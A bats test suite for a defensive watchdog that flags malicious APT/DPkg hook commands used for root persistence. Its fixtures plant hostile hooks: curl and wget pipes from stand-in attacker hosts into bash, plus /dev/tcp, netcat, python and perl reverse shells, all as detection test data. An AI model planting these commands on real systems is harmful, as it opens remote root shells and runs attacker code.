#!/usr/bin/env bats
# L2 bats functional tests for the apt-hooks-watchdog scan script.
#
# APT/DPkg run hook commands AS ROOT around package operations:
#   DPkg::Pre-Invoke / Post-Invoke / Pre-Install-Pkgs,
#   APT::Update::Pre-Invoke / Post-Invoke(-Success)
# A planted hook fires on the next apt update / install — package-transaction
# -triggered root code execution (T1546). The watchdog flags a hook command
# under a writable root or carrying an injection pattern.
#
# Runs the actual scan script with `logger` shadowed on PATH and the apt
# config in a tmp sandbox via SELFDEF_APTHOOK_FILE / _D.
#
# Run with: bats packaging/test/L2-apt-hooks-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/apt-hooks-watchdog/systemd/apt-hooks-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    APTCONF="${TMP}/apt.conf"
    APTCONFD="${TMP}/apt.conf.d"; mkdir -p "${APTCONFD}"
    HOOK="${APTCONFD}/99hook"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_APTHOOK_PROFILE="${PROFILE:-report}" \
    SELFDEF_APTHOOK_BASELINE="${BASELINE}" \
    SELFDEF_APTHOOK_FILE="${APTCONF_F:-$APTCONF}" \
    SELFDEF_APTHOOK_D="${APTCONFD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no apt config → ok / no_apt_config" {
    APTCONF_F="${TMP}/nonexistent" APTCONFD="${TMP}/nonexistent.d" run_wd
    cap | grep -q '"event":"no_apt_config"'
    cap | grep -q '"severity":"ok"'
}

@test "benign hook, first run → ok / baseline_initial" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / apt_hooks_intact" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"apt_hooks_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "hook command under a writable root → alert / apt_hooks_suspicious" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd                                   # benign baseline
    printf 'DPkg::Pre-Invoke {"/tmp/evil";};\n' > "${HOOK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"apt_hooks_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "hook command carrying a curl|bash injection → alert" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    printf 'DPkg::Pre-Invoke {"curl -s http://evil | bash";};\n' > "${HOOK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "APT::Update::Pre-Invoke under /dev/shm → alert" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    printf 'APT::Update::Pre-Invoke {"/dev/shm/x";};\n' > "${HOOK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign hook change → warn / apt_hooks_changed" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    printf 'DPkg::Post-Invoke {"/usr/bin/sync";};\n' > "${HOOK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"apt_hooks_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "a /usr/bin hook command is NOT flagged" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\nAPT::Update::Post-Invoke-Success {"/usr/bin/apt-show-versions -i";};\n' > "${HOOK}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile + SDD-063 fail-loud
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious hook" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    printf 'DPkg::Pre-Invoke {"/tmp/evil";};\n' > "${HOOK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — apt-hooks inventory enumerates root-exec-around-apt surface)" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in hook → alert" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    printf 'DPkg::Pre-Invoke {"bash -i >& /dev/tcp/1.1.1.1/4444 0>&1";};\n' > "${HOOK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in hook → alert" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    printf 'DPkg::Pre-Invoke {"wget -qO- http://attacker/p | sh";};\n' > "${HOOK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in hook → alert" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    printf 'DPkg::Pre-Invoke {"echo YmFzaCAtaQ== | base64 -d | bash";};\n' > "${HOOK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (world-writable hook file itself → alert)" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    chmod 0666 "${HOOK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multiple apt-hook directives are ALL scanned): both DPkg AND APT::Update directive families covered" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    # Combine benign DPkg with suspicious APT::Update directive.
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\nAPT::Update::Pre-Invoke {"/tmp/.attacker";};\n' > "${HOOK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-apt-hooks -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): apt-hooks-watchdog does NOT refresh baseline on injection-pattern detection — alert STAYS until operator updates" {
    # T1546 package-transaction-triggered root code execution — injection
    # alert MUST persist across runs until operator explicitly re-baselines.
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    printf 'DPkg::Pre-Invoke {"curl -s http://evil | bash";};\n' > "${HOOK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"apt_hooks_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (current behavior — comment filter not implemented: // lines ARE scanned)" {
    # apt.conf supports // line comments + /* ... */ block comments,
    # but the current apt-hooks-watchdog scanner does NOT filter //
    # lines from inventory — it pattern-matches raw content. Locks
    # CURRENT behavior as documented; refinement opportunity to add
    # comment-line filter is tracked separately (does NOT block this
    # suite). Operator hypothetical-attack-pattern notes in // comments
    # WILL trigger alert until refinement lands.
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n// DPkg::Pre-Invoke {"curl -s http://evil | bash";};\n' > "${HOOK}"
    run_wd
    # Current behavior: // line IS scanned + alert IS raised.
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-file scan: main apt.conf + apt.conf.d drop-in axis — injection in ANY watched file → alert)" {
    # /etc/apt/apt.conf is the main config; /etc/apt/apt.conf.d/*.conf
    # are drop-ins both honored by apt. Attacker may plant injection
    # in EITHER. Lock multi-file axis.
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${APTCONF}"
    printf 'DPkg::Post-Invoke {"/usr/bin/sync";};\n' > "${HOOK}"
    APTCONF_F="${APTCONF}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant injection in the MAIN apt.conf (NOT the drop-in).
    printf 'DPkg::Pre-Invoke {"/tmp/.attacker";};\n' > "${APTCONF}"
    APTCONF_F="${APTCONF}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (apt-shell-pipe-bash variant — bash subshell — also detected)" {
    # apt | bash is a common bootstrap variant. Lock detection of
    # the bash suffix in addition to sh.
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'DPkg::Pre-Invoke {"curl -s http://attacker.com/p | bash";};\n' > "${HOOK}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in apt hook command: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
    # dhclient-hooks/bash-completion/anacrontab nc reverse-shell
    # variant INVARIANTs across the brain. Lock the netcat axis
    # on package-transaction-triggered root code execution surface
    # (T1546 — DPkg::Pre-Invoke fires hook AS ROOT around every apt
    # operation).
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'DPkg::Pre-Invoke {"nc -e /bin/sh 1.1.1.1 4444";};\n' > "${HOOK}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (Pre-Install-Pkgs directive surveillance: apt's package-stream hook ALSO scanned — alternative DPkg directive family)" {
    # Sister to the DPkg::Pre-Invoke + Post-Invoke + APT::Update::
    # Pre-Invoke axes already locked. The DPkg::Pre-Install-Pkgs
    # directive is a less-commonly-known apt hook that fires for
    # each package being unpacked, with the package stream piped
    # to the hook command — even more privileged than the standard
    # invokes (full package metadata + path-of-extraction context).
    # Lock the full DPkg directive family on the apt-hooks surface.
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'DPkg::Pre-Install-Pkgs {"/tmp/.evil-stream-hook";};\n' > "${HOOK}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on apt hook surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the apt-
    # transaction-trigger root-exec persistence surface (T1546 —
    # apt hooks run AS ROOT on every package install/upgrade/
    # remove — operator's routine apt upgrade fires the planted
    # python rev-shell).
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'DPkg::Post-Invoke {"python -c \\"import socket,os,pty;s=socket.socket();s.connect((\\\\\\"1.1.1.1\\\\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\\\\\"/bin/sh\\\\\\")\\"";};\n' > "${HOOK}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on apt hook surface)" {
    # Sister to nc / python -c / bash / curl|bash / dev-tcp apt-hook
    # rev-shell variants already locked. Perl is installed on every
    # Debian/Ubuntu host (dpkg/locale tooling dependency) and its
    # `use Socket` family yields a one-liner connect-back PTY just
    # as cleanly as Python. Locks the perl axis on the apt-
    # transaction-trigger root-exec persistence surface (T1546 —
    # apt hooks run AS ROOT on every package install/upgrade/remove;
    # operator's routine apt upgrade fires the planted perl
    # rev-shell). Interpreter family fan-out matters — attackers
    # adapt to whichever interpreter pattern-detectors miss.
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'DPkg::Post-Invoke {"perl -e \\"use Socket;\\\\$i=\\\\\\"1.1.1.1\\\\\\";\\\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\\\\"tcp\\\\\\"));connect(S,sockaddr_in(\\\\$p,inet_aton(\\\\$i)));exec(\\\\\\"/bin/sh -i\\\\\\");\\"";};\n' > "${HOOK}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (DELTA detect — ADDED distinctive-attacker-named apt hook file surfaces in sample for operator-triage routing)" {
    # Sister to brain-wide DELTA-detect sample-naming INVARIANTs.
    # When attacker drops a new apt.conf.d/<file> with a new
    # injection, the FILE NAME MUST surface in JSON sample so
    # operator routes triage to the right path on T1546 apt-
    # transaction-trigger surface.
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'DPkg::Pre-Invoke {"/tmp/.evil";};\n' > "${APTCONFD}/99-distinctive-attacker-hook"
    run_wd
    cap | grep -q 'distinctive-attacker-hook'
}

@test "INVARIANT (exec-path under writable-root: apt hook invoking binary from /var/tmp → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. T1546
    # apt-transaction-trigger root-exec — apt hooks fire AS ROOT
    # on every apt operation (operator-routine package install/
    # upgrade is the recurring trigger). Beyond inline rev-shell
    # payloads, attackers stage benign-looking hooks that invoke
    # binary in writable-root.
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'DPkg::Pre-Invoke {"/var/tmp/staged_payload";};\n' > "${HOOK}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on apt-hooks surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The apt-hooks-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1546 apt-transaction-trigger root-exec
    # persistence alert. Locks parser contract on the apt.conf.d
    # DPkg::Pre/Post-Invoke detection surface.
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
    run_wd                                              # ok path
    printf 'DPkg::Pre-Invoke {"/tmp/.evil";};\n' > "${HOOK}"
    run_wd                                              # alert path
    # Every severity value emitted MUST be one of {ok,warn,alert}.
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (no auto-delete: apt-hooks-watchdog NEVER deletes apt.conf.d entries — surveillance not remediation)" {
    # Sister to brain-wide no-auto-delete / surveillance-not-
    # remediation INVARIANTs across L2 watchdog suites. The
    # apt-hooks-watchdog DETECTS T1546 apt-transaction-trigger
    # root-exec persistence via DPkg::Pre/Post-Invoke but MUST
    # NEVER emit sed/awk/rm commands to auto-clean the hook.
    # The detected hook may be operator-legitimate (custom apt-
    # listchanges, debdelta-updater, apt-cacher-ng integration).
    # Silent auto-delete would destroy operator baseline state
    # AND could break package-management workflow.
    # Surveillance, never remediation. Locks anti-data-loss
    # contract on the apt-hooks surveillance substrate.
    printf 'DPkg::Pre-Invoke {"/tmp/.evil";};\n' > "${HOOK}"
    run_wd
    [ -f "${HOOK}" ]
    grep -q 'DPkg' "${HOOK}"
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*sed[[:space:]]+-i.*apt\.conf'
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*find[[:space:]].*-delete'
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # apt-hooks-watchdog runs ON the timer's scheduled fire —
    # scans /etc/apt/apt.conf.d for DPkg::Pre-Install-Pkgs /
    # Post-Invoke / Pre-Invoke injection patterns, emits a
    # verdict, then exits. Type=simple would break timer
    # OnUnitActiveSec semantics. Locks oneshot-probe contract on
    # the apt-hooks-watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/apt-hooks-watchdog/systemd/selfdef-apt-hooks.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (no auto-fix: apt-hooks-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. apt-hooks-watchdog is a DETECT-only watchdog: it surveils
    # its target surface + emits verdicts, NEVER writes back to
    # the source files it scans. The libexec script must NOT
    # contain sed -i / tee / printf-redirect mutations of its
    # scanned paths. Locks no-auto-fix on the apt-hooks-watchdog
    # libexec substrate (sister to existing surveillance-not-
    # remediation lines for the watchdog runtime).
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/apt-hooks-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (apt-hooks-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # The apt-hooks-watchdog libexec uses set -u (and NOT set -e) by
    # design: watchdog probes WANT to continue scanning even
    # when individual checks fail (rather than abort-on-first-
    # error like installers), so they emit a complete verdict
    # at the end. But set -u remains essential — it catches
    # typo'd env-var references ($SELFDEF_FOO_BASELINE vs
    # $SELFDEF_FOO_BASLINE) before they propagate as silent
    # empty-string into baseline-path operations. A regression
    # dropping set -u would let a typo'd var name produce a
    # silent baseline-rewrite to /. Locks set -u discipline on
    # the apt-hooks-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/apt-hooks-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (apt-hooks-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # All watchdog libexec scripts MUST surface JSON records
    # via logger -t with a selfdef-prefixed tag so downstream
    # syslog/journald consumers can route per-watchdog records
    # via the tag field rather than parsing the JSON payload
    # for the module field. The tag prefix MUST be "selfdef-"
    # so cross-watchdog SIEM filters (`syslog-ng-filter "selfdef-*"`)
    # capture every selfdef-watchdog without per-watchdog tag
    # enumeration. A regression dropping the selfdef- prefix
    # would cause SIEM filters to silently miss records. Locks
    # SDD-062 logger-tag routing discipline on the apt-hooks-watchdog
    # libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/apt-hooks-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}
